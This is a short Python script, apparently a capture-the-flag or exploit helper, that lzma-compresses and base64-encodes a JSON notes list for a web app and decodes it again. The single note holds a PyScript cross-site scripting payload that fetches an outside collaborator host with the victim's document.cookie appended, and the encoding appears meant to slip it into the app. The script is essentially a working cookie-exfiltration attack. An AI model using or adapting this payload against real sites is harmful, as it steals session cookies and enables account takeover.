from base64 import b64encode, b64decode
from lzma import compress, decompress
import json


def decodeNotes(encodedNotes):
    notes = {}
    try:
        encoded_notes = encodedNotes.encode()
        decoded_notes = decompress(b64decode(encoded_notes))
        notes = json.loads(decoded_notes.decode('utf-8'))
    except:
        notes = {}

    return notes


def encodeNotes(json_str):
    return b64encode(compress(json_str.encode())).decode()


def main():
    # [{'prompt': '', 'answer': '', 'tag': 'p'}]
    notes = '''[{\"prompt\":\"import js;print(js.fetch('http://xpqnv3xvvgjlpya81elqfr09e0kz8o.oastify.com/?c=' + document.cookie))\",\"answer\":\"print(2+2)\",\"tag\":\"py-script\"}]'''
    encodedNotes = encodeNotes(notes)
    print(f'Before encoded: {notes}')
    print(f'After encoded: {encodedNotes}')

    decodedNotes = decodeNotes(encodedNotes)
    print(f'After decoded: {decodedNotes}')


if __name__ == '__main__':
    main()
